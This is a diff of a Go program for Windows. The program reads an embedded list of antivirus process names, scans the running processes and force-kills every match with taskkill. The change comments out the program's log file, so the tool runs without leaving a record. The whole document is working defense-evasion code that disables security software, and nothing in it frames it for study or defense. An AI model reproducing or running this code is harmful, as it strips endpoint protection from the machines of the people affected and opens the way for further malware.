@@ -17,19 +17,19 @@ import (
 //go:embed AvList.txt.gz
 var avListGZ []byte
 
-var f *os.File
+//var f *os.File
 
 func main() {
 	if runtime.GOOS != "windows" {
 		fmt.Println("This application should run only under Windows")
 		os.Exit(1)
 	}
-	var err error
-	f, err = os.Create("C:\\antiav.txt")
-	if err != nil {
-		panic(err)
-	}
-	defer f.Close()
+	// 	var err error
+	//	f, err = os.Create("C:\\antiav.txt")
+	//	if err != nil {
+	//		panic(err)
+	//	}
+	//	defer f.Close()
 	avList := GetAVList()
 	tasks := TasksList()
 	list := IterateProcess(tasks)
@@ -37,7 +37,7 @@ func main() {
 		if avList.isAV(each) {
 			TaskKill(each)
 		} else {
-			fmt.Fprintf(f, "Skip %s\n", each)
+			//fmt.Fprintf(f, "Skip %s\n", each)
 		}
 	}
 }
@@ -45,7 +45,7 @@ func main() {
 func TaskKill(name string) {
 	name = strings.TrimSpace(name)
 	name = strings.ReplaceAll(name, " ", "")
-	fmt.Fprintf(f, "Kill: \"%s\"\n", name)
+	//	fmt.Fprintf(f, "Kill: \"%s\"\n", name)
 	cmd := exec.Command("taskkill.exe", "/IM", name, "/F", "/T")
 	output, err := cmd.CombinedOutput()
 	if err != nil {
@@ -55,7 +55,7 @@ func TaskKill(name string) {
 		fmt.Println("Error: ", err)
 	}
 	fmt.Println(string(output))
-	fmt.Fprintf(f, "%s: %s", name, string(output))
+	//	fmt.Fprintf(f, "%s: %s", name, string(output))
 }
 
 func TasksList() string {
@@ -83,30 +83,7 @@ func IterateProcess(csvTaskList string) (result []string) {
 	return
 }
 
-/*
-func isAv(name string) bool {
-	name = strings.ToLower(name)
-	for _, each := range strings.Split(avList, "\n") {
-		each = strings.TrimSpace(each)
-		each = strings.ReplaceAll(each, " ", "")
-		if name == strings.ToLower(each) {
-			return true
-		}
-	}
-	return false
-}*/
-
 type AVList []string
-
-func (a AVList) isAV(name string) bool {
-	name = strings.ToLower(name)
-	for _, each := range a {
-		if name == each {
-			return true
-		}
-	}
-	return false
-}
 
 func GetAVList() (result AVList) {
 	gz, err := gzip.NewReader(bytes.NewReader(avListGZ))
@@ -123,4 +100,14 @@ func GetAVList() (result AVList) {
 		result = append(result, each)
 	}
 	return
+}
+
+func (a AVList) isAV(name string) bool {
+	name = strings.ToLower(name)
+	for _, each := range a {
+		if name == each {
+			return true
+		}
+	}
+	return false
 }
